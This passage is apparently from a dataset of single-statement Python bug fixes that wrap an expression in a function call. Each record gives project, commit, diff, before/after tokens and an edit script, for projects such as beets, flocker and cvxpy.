[\"identifier:k\", \"T\"], 0], [\"Insert\", \"N4\", [\"attribute\", \"N5\"], 0], [\"Insert\", \"N4\", [\"argument_list\", \"N6\"], 1], [\"Insert\", \"N5\", [\"identifier:k\", \"T\"], 0], [\"Insert\", \"N5\", [\".:.\", \"T\"], 1], [\"Insert\", \"N5\", [\"identifier:getMetaDataEntry\", \"T\"], 2], [\"Insert\", \"N6\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N6\", [\"string:\\\"position\\\"\", \"T\"], 1], [\"Insert\", \"N6\", [\"):)\", \"T\"], 2]]"}
{"project": "flocker", "commit_sha": "e7af9c948aa331868a9a3fea8ec8bf8f7122b3f5", "parent_sha": "636dc0bfe99dc866b047f305bc9d2c9f466f49a7", "file_path": "flocker/acceptance/endtoend/test_leases.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -224,7 +224,7 @@ class LeaseAPITests(AsyncTestCase):\n             operation=cluster.client.move_dataset,\n             additional_kwargs={'primary': target_node},\n             state_method=lambda dataset: cluster.wait_for_dataset(\n-                dataset.set(primary=target_node))\n+                dataset.set(primary=UUID(target_node)))\n         )\n \n     @require_moving_backend\n", "before": "state_method = lambda dataset : cluster . wait_for_dataset ( dataset . set ( primary = target_node ) )", "after": "state_method = lambda dataset : cluster . wait_for_dataset ( dataset . set ( primary = UUID ( target_node ) ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 29, 3, 48], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:UUID\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:target_node\", 3, 37, 3, 48], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "flocker", "commit_sha": "015fdee7b29fb76901c61b6782b3335f9db3b3e5", "parent_sha": "029670512f6e1569d281ad343ae928bc2c43c456", "file_path": "flocker/provision/_libcloud.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -171,7 +171,7 @@ class LibcloudProvisioner(object):\n                 # available. Re-raise the the exception, so that we can\n                 # accurately see the cause of the error.\n                 raise\n-            raise CloudKeyNotFound(self._keyname)\n+            raise CloudKeyNotFound(\"{}: {}\".format(self._keyname, str(e)))\n         if key_pair.public_key is not None:\n             return Key.fromString(key_pair.public_key, type='public_openssh')\n         else:\n", "before": "raise CloudKeyNotFound ( self . _keyname )", "after": "raise CloudKeyNotFound ( \"{}: {}\" . format ( self . _keyname , str ( e ) ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 35, 3, 50], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 35, 3, 50], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 35, 3, 50], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"string:\\\"{}: {}\\\"\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:format\", \"T\"], 2], [\"Move\", \"N2\", [\"(:(\", 3, 35, 3, 36], 0], [\"Move\", \"N2\", [\"attribute\", 3, 36, 3, 49], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"call\", \"N3\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4], [\"Insert\", \"N3\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N3\", [\"argument_list\", \"N4\"], 1], [\"Insert\", \"N4\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N4\", [\"identifier:e\", \"T\"], 1], [\"Move\", \"N4\", [\"):)\", 3, 49, 3, 50], 2]]"}
{"project": "beets", "commit_sha": "f6ff974255469f829073c00a4bc7725dfa2050f0", "parent_sha": "4222b37bc29c540c2ef6ab1a295fe8ab351dc03b", "file_path": "beets/mediafile.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -460,7 +460,7 @@ class MediaField(object):\n                     else:\n                         if self.out_type == bool:\n                             # store bools as 1,0 instead of True,False\n-                            out = unicode(int(out))\n+                            out = unicode(int(bool(out)))\n                         elif isinstance(out, str):\n                             out = out.decode('utf8', 'ignore')\n                         else:\n", "before": "else : if self . out_type == bool : out = unicode ( int ( out ) )", "after": "else : if self . out_type == bool : out = unicode ( int ( bool ( out ) ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 46, 3, 51], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 46, 3, 51], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 46, 3, 51], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"identifier:bool\", \"T\"], 0], [\"Move\", \"N0\", [\"argument_list\", 3, 46, 3, 51], 1]]"}
{"project": "beets", "commit_sha": "4f596725ae628648925fb0f6d8a5d5c9dcbf468b", "parent_sha": "6b8019f60f98d1d557f34bb2b159855290b7f26e", "file_path": "beetsplug/convert.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -208,7 +208,7 @@ class ConvertPlugin(BeetsPlugin):\n         except OSError as exc:\n             raise ui.UserError(\n                 u\"convert: could invoke '{0}': {1}\".format(\n-                    ' '.join(args), exc\n+                    ' '.join(ui.decargs(args)), exc\n                 )\n             )\n \n", "before": "exc : raise ui . UserError ( u\"convert: could invoke '{0}': {1}\" . format ( ' ' . join ( args ) , exc ) )", "after": "exc : raise ui . UserError ( u\"convert: could invoke '{0}': {1}\" . format ( ' ' . join ( ui . decargs ( args ) ) , exc ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 29, 3, 35], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 29, 3, 35], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 29, 3, 35], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Move\", \"N0\", [\"argument_list\", 3, 29, 3, 35], 1], [\"Insert\", \"N1\", [\"identifier:ui\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:decargs\", \"T\"], 2]]"}
{"project": "beets", "commit_sha": "9b05401457970e6372620ae65ad133593918d5f7", "parent_sha": "fd4a81cf3dede18d878db1f00cbfcf3498f06c96", "file_path": "beets/importer.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1408,7 +1408,7 @@ def group_albums(session):\n         if task.skip:\n             continue\n         tasks = []\n-        for _, items in itertools.groupby(task.items, group):\n+        for _, items in itertools.groupby(sorted(task.items,key=group), group):\n             items = list(items)\n             task = ImportTask(task.toppath, [i.path for i in items],\n                               items)\n", "before": "for _ , items in itertools . groupby ( task . items , group ) : items = list ( items ) task = ImportTask ( task . toppath , [ i . path for i in items ] , items )", "after": "for _ , items in itertools . groupby ( sorted ( task . items , key = group ) , group ) : items = list ( items ) task = ImportTask ( task . toppath , [ i . path for i in items ] , items )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 42, 3, 61], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 42, 3, 61], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 42, 3, 61], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 42, 3, 61], [\"identifier:group\", \"T\"], 3], [\"Insert\", [\"argument_list\", 3, 42, 3, 61], [\"):)\", \"T\"], 4], [\"Insert\", \"N0\", [\"identifier:sorted\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Move\", \"N1\", [\"(:(\", 3, 42, 3, 43], 0], [\"Move\", \"N1\", [\"attribute\", 3, 43, 3, 53], 1], [\"Move\", \"N1\", [\",:,\", 3, 53, 3, 54], 2], [\"Insert\", \"N1\", [\"keyword_argument\", \"N2\"], 3], [\"Move\", \"N1\", [\"):)\", 3, 60, 3, 61], 4], [\"Insert\", \"N2\", [\"identifier:key\", \"T\"], 0], [\"Insert\", \"N2\", [\"=:=\", \"T\"], 1], [\"Move\", \"N2\", [\"identifier:group\", 3, 55, 3, 60], 2]]"}
{"project": "beets", "commit_sha": "f6ecbf659fc0f9d387b2745e6a3856ac9861be2e", "parent_sha": "ebf98d7bf0dedf762c4794cd834668d86b31acf1", "file_path": "beetsplug/duplicates.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -259,7 +259,7 @@ class DuplicatesPlugin(BeetsPlugin):\n                     return v is not None and \\\n                         (v != '' if isinstance(v, unicode) else True)\n                 fields = kind.all_keys()\n-                key = lambda x: sum(1 for f in fields if truthy(f))\n+                key = lambda x: sum(1 for f in fields if truthy(getattr(x, f)))\n             else:\n                 key = lambda x: len(x.items())\n \n", "before": "key = lambda x : sum ( 1 for f in fields if truthy ( f ) )", "after": "key = lambda x : sum ( 1 for f in fields if truthy ( getattr ( x , f ) ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 64, 3, 67], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 64, 3, 67], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"identifier:getattr\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"identifier:x\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Move\", \"N1\", [\"identifier:f\", 3, 65, 3, 66], 3], [\"Move\", \"N1\", [\"):)\", 3, 66, 3, 67], 4]]"}
{"project": "beets", "commit_sha": "74f58e7b3cde535071f78c18b50d51f1ea7bb531", "parent_sha": "89e4a848b449dace936e47658bae15596074fb0b", "file_path": "beetsplug/lastgenre/__init__.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -411,7 +411,7 @@ class LastGenrePlugin(plugins.BeetsPlugin):\n \n         # Filter by weight (optionally).\n         if min_weight:\n-            res = [el for el in res if (el.weight or 0) >= min_weight]\n+            res = [el for el in res if (int(el.weight) or 0) >= min_weight]\n \n         # Get strings from tags.\n         res = [el.item.get_name().lower() for el in res]\n", "before": "res = [ el for el in res if ( el . weight or 0 ) >= min_weight ]", "after": "res = [ el for el in res if ( int ( el . weight ) or 0 ) >= min_weight ]", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 41, 3, 55], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"identifier:int\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"attribute\", 3, 41, 3, 50], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "beets", "commit_sha": "c54105d2721a2e5bbb5d74e61de8fc8469a1dc57", "parent_sha": "6095914d3001f6097956238482621494d481cee5", "file_path": "beetsplug/badfiles.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -81,7 +81,7 @@ class BadFiles(BeetsPlugin):\n             return self.check_flac\n \n     def check_bad(self, lib, opts, args):\n-        for item in lib.items(args):\n+        for item in lib.items(ui.decargs(args)):\n \n             # First, check whether the path exists. If not, the user\n             # should probably run `beet update` to cleanup your library.\n", "before": "for item in lib . items ( args ) : ", "after": "for item in lib . items ( ui . decargs ( args ) ) : ", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 36], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 30, 3, 36], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 30, 3, 36], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Move\", \"N0\", [\"argument_list\", 3, 30, 3, 36], 1], [\"Insert\", \"N1\", [\"identifier:ui\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:decargs\", \"T\"], 2]]"}
{"project": "beets", "commit_sha": "895ee7de3fbe51f7bde3d59a9ed98c282252704d", "parent_sha": "f4107703fb4d75adf9ec750d0b6e191cc7d0f695", "file_path": "beetsplug/smartplaylist.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -42,7 +42,7 @@ def update_playlists(lib):\n         else:\n             paths = [item.path for item in items]\n         basename = playlist['name'].encode('utf8')\n-        m3u_path = os.path.join(playlist_dir, basename)\n+        m3u_path = normpath(os.path.join(playlist_dir, basename))\n         with open(syspath(m3u_path), 'w') as f:\n             for path in paths:\n                 f.write(path + '\\n')\n", "before": "m3u_path = os . path . join ( playlist_dir , basename )", "after": "m3u_path = normpath ( os . path . join ( playlist_dir , basename ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 20, 3, 56], [\"identifier:normpath\", \"T\"], 0], [\"Insert\", [\"call\", 3, 20, 3, 56], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 20, 3, 56], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "beets", "commit_sha": "e2d3ba1c2318ac80675b4bdf489104a975f49902", "parent_sha": "7df8bef8b7201395886a23eaf925b46090763655", "file_path": "beets/library.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -509,7 +509,7 @@ class Item(LibModel):\n             self.write(path)\n             return True\n         except FileOperationError as exc:\n-            log.error(exc)\n+            log.error(str(exc))\n             return False\n \n     def try_sync(self, write=None):\n", "before": "FileOperationError as exc : log . error ( exc )", "after": "FileOperationError as exc : log . error ( str ( exc ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 22, 3, 27], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 22, 3, 27], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 22, 3, 27], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Move\", \"N0\", [\"argument_list\", 3, 22, 3, 27], 1]]"}
{"project": "beets", "commit_sha": "4e5ac89b2a5055118db8c2d1a4606124f2198024", "parent_sha": "167544bcbee48e97213b327ab9a7ceb721845dbb", "file_path": "test/test_mediafile.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -678,7 +678,7 @@ class ReadWriteTestBase(ArtTestMixin, GenreListTestMixin,\n             self.fail('\\n  '.join(errors))\n \n     def _mediafile_fixture(self, name):\n-        name = name + '.' + self.extension\n+        name = bytestring_path(name + '.' + self.extension)\n         src = os.path.join(_common.RSRC, name)\n         target = os.path.join(self.temp_dir, name)\n         shutil.copy(src, target)\n", "before": "name = name + '.' + self . extension", "after": "name = bytestring_path ( name + '.' + self . extension )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 43], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:bytestring_path\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"binary_operator\", 3, 16, 3, 43], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "beets", "commit_sha": "d384b07914457ad960f633a12776a2c7ba9e086a", "parent_sha": "925d7bebf9e8408d5bf56a6eb34211d38dd43425", "file_path": "beetsplug/fromfilename.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -101,7 +101,7 @@ def apply_matches(d):\n     \"\"\"Given a mapping from items to field dicts, apply the fields to\n     the objects.\n     \"\"\"\n-    some_map = d.values()[0]\n+    some_map = list(d.values())[0]\n     keys = some_map.keys()\n \n     # Only proceed if the \"tag\" field is equal across all filenames.\n", "before": "some_map = d . values ( ) [ 0 ]", "after": "some_map = list ( d . values ( ) ) [ 0 ]", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 16, 3, 26], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 3, 16, 3, 26], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 26], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "flocker", "commit_sha": "0e0a1f9a9219f3b657bc4871c735455256a41ced", "parent_sha": "c4a91074fbf0302d312e71e2ab90b8961d7fa188", "file_path": "flocker/node/test/test_config.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2644,7 +2644,7 @@ class MarshalConfigurationTests(SynchronousTestCase):\n             'applications': {\n                 'mysql-hybridcluster': {\n                     'volume': {'mountpoint': b'/var/mysql/data',\n-                               'maximum_size': EXPECTED_MAX_SIZE},\n+                               'maximum_size': str(EXPECTED_MAX_SIZE)},\n                     'image': u'flocker/mysql:v1.0.0'\n                 }\n             },\n", "before": "{ 'mysql-hybridcluster' : { 'volume' : { 'mountpoint' : b'/var/mysql/data' , 'maximum_size' : EXPECTED_MAX_SIZE } , 'image' : u'flocker/mysql:v1.0.0' } } ,", "after": "{ 'mysql-hybridcluster' : { 'volume' : { 'mountpoint' : b'/var/mysql/data' , 'maximum_size' : str ( EXPECTED_MAX_SIZE ) } , 'image' : u'flocker/mysql:v1.0.0' } } ,", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"pair\", 3, 32, 3, 65], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:EXPECTED_MAX_SIZE\", 3, 48, 3, 65], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "PyNN", "commit_sha": "ca503c28967ce0721afe96632e0f8eb109dea6b6", "parent_sha": "d9f0bd56cc05b07950604e16ff851a968068e5a9", "file_path": "src/brian/recording.py", "project_url": "https://github.com/pgleeson/PyNN", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -53,7 +53,7 @@ class Recorder(recording.Recorder):\n         #update StateMonitor.record and StateMonitor.recordindex\n         if not variable is 'spikes':\n             device = self._devices[variable]\n-            device.record = numpy.fromiter(self.recorded[variable], dtype=int) - self.population.first_id\n+            device.record = numpy.sort(numpy.fromiter(self.recorded[variable], dtype=int)) - self.population.first_id\n             device.recordindex = dict((i,j) for i,j in zip(device.record,\n                                                            range(len(device.record))))\n             logger.debug(\"recording %s from %s\" % (variable, self.recorded[variable]))\n", "before": "device . record = numpy . fromiter ( self . recorded [ variable ] , dtype = int ) - self . population . first_id", "after": "device . record = numpy . sort ( numpy . fromiter ( self . recorded [ variable ] , dtype = int ) ) - self . population . first_id", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 29, 3, 79], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 29, 3, 79], [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N0\", [\"identifier:numpy\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:sort\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"call\", 3, 29, 3, 79], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "django-machina", "commit_sha": "62dab0cf9420e2ced231d97ef2a21aacd401ab0a", "parent_sha": "69b84f51670d284194bf79e2776bc5ab8cd36340", "file_path": "machina/__init__.py", "project_url": "https://github.com/eliksir/django-machina", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -43,7 +43,7 @@ def get_apps(overrides=None):\n         pattern = app_label.replace('machina.apps.', '')\n         return next((o for o in overrides if o.endswith(pattern)), app_label)\n \n-    return map(get_app_label, MACHINA_VANILLA_APPS)\n+    return list(map(get_app_label, MACHINA_VANILLA_APPS))\n \n \n pkg_resources = __import__('pkg_resources')\n", "before": "return map ( get_app_label , MACHINA_VANILLA_APPS )", "after": "return list ( map ( get_app_label , MACHINA_VANILLA_APPS ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 12, 3, 52], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 3, 12, 3, 52], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 52], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "django-machina", "commit_sha": "a33e791e429731b2f1c2038cfff17a435449c3f8", "parent_sha": "d540fe8bfe4740f3ddbe5d0e18604fa14e89ba75", "file_path": "machina/core/db/models.py", "project_url": "https://github.com/eliksir/django-machina", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -58,4 +58,4 @@ def model_factory(abstract_class):\n     model_name = abstract_class.__name__.replace('Abstract', '')\n \n     if not is_model_registered(app_label, model_name):\n-        return type(model_name, (abstract_class, ), {'__module__': __name__, })\n+        return type(str(model_name), (abstract_class, ), {'__module__': __name__, })\n", "before": "return type ( model_name , ( abstract_class , ) , { '__module__' : __name__ , } )", "after": "return type ( str ( model_name ) , ( abstract_class , ) , { '__module__' : __name__ , } )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 20, 3, 80], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:model_name\", 3, 21, 3, 31], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "cvxpy", "commit_sha": "5fa63e24953d67caaa251f01a9319b6a10fce015", "parent_sha": "e0c16580d826b619005a52a96a97aa324de28985", "file_path": "cvxpy/problems/solvers/cvxopt_intf.py", "project_url": "https://github.com/zqcr/cvxpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -159,7 +159,7 @@ class CVXOPT(Solver):\n     @staticmethod\n     def _restore_solver_options(old_options):\n         import cvxopt.solvers\n-        for key, value in cvxopt.solvers.options.items():\n+        for key, value in list(cvxopt.solvers.options.items()):\n             if key in old_options:\n                 cvxopt.solvers.options[key] = old_options[key]\n             else:\n", "before": "for key , value in cvxopt . solvers . options . items ( ) : if key in old_options : cvxopt . solvers . options [ key ] = old_options [ key ] else : ", "after": "for key , value in list ( cvxopt . solvers . options . items ( ) ) : if key in old_options : cvxopt . solvers . options [ key ] = old_options [ key ] else : ", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 27, 3, 57], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 3, 27, 3, 57], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 27, 3, 57], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "larray", "commit_sha": "fe0f99127b0c2c1bda1c8aeb0f620bc27b106e9f", "parent_sha": "71c9e445dca09b965aa61708d95dd075a1cf9066", "file_path": "larray/ipfp.py", "project_url": "https://github.com/alixdamman/larray", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -17,7 +17,7 @@ def f2str(f, threshold=2):\n-    kind = \"e\" if f and math.log10(1 / f) > threshold else \"f\"\n+    kind = \"e\" if f and math.log10(1 / abs(f)) > threshold else \"f\"\n     format_str = \"%%.%d%s\" % (threshold, kind)\n     return format_str % f\n \n", "before": "kind = \"e\" if f and math . log10 ( 1 / f ) > threshold else \"f\"", "after": "kind = \"e\" if f and math . log10 ( 1 / abs ( f ) ) > threshold else \"f\"", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"binary_operator\", 0, 36, 0, 41], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:abs\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:f\", 0, 40, 0, 41], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "PyMySQL", "commit_sha": "0db920c283a97d006903d54b14f730f87cd87bbf", "parent_sha": "a665a11fa7d2a989c18abfc71597850ff47a7688", "file_path": "pymysql/converters.py", "project_url": "https://github.com/fanout/PyMySQL", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -60,7 +60,7 @@ def escape_object(value):\n     return str(value)\n \n def escape_int(value):\n-    return value\n+    return str(value)\n \n escape_long = escape_object\n \n", "before": "return value", "after": "return str ( value )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 5, 3, 17], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:value\", 3, 12, 3, 17], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "pyload.plugins", "commit_sha": "2fa8142c31003a62cce8bbf8535023a6926ffa16", "parent_sha": "8e1b5b4d192245cffc392c66fe4ee49d15e9282d", "file_path": "module/network/Request.py", "project_url": "https://github.com/vuolter/pyload.plugins", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -84,7 +84,7 @@ class Request:\n             (\"Accept-Charset\", \"ISO-8859-1,utf-8;q=0.7,*;q=0.7\")]\n \n     def set_timeout(self, timeout):\n-        self.timeout = timeout\n+        self.timeout = int(timeout)\n \n     def init_curl(self):\n         self.rep = StringIO()\n", "before": "self . timeout = timeout", "after": "self . timeout = int ( timeout )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 31], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:int\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:timeout\", 3, 24, 3, 31], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "zulip", "commit_sha": "90f57c92d406dc83644c9ea0581effba229416e1", "parent_sha": "c89a2ffe2f34a5fafa661053f99828b4f1fee07b", "file_path": "zerver/lib/actions.py", "project_url": "https://github.com/punit-agarwal/zulip", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -597,7 +597,7 @@ def compute_mit_user_fullname(email):\n             answer = DNS.dnslookup(\n                 \"%s.passwd.ns.athena.mit.edu\" % (match_user.group(1),),\n                 DNS.Type.TXT)\n-            hesiod_name = answer[0][0].split(':')[4].split(',')[0].strip()\n+            hesiod_name = force_str(answer[0][0]).split(':')[4].split(',')[0].strip()\n             if hesiod_name != \"\":\n                 return hesiod_name\n         elif match_user:\n", "before": "hesiod_name = answer [ 0 ] [ 0 ] . split ( ':' ) [ 4 ] . split ( ',' ) [ 0 ] . strip ( )", "after": "hesiod_name = force_str ( answer [ 0 ] [ 0 ] ) . split ( ':' ) [ 4 ] . split ( ',' ) [ 0 ] . strip ( )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"attribute\", 3, 27, 3, 45], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"identifier:force_str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"subscript\", 3, 27, 3, 39], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
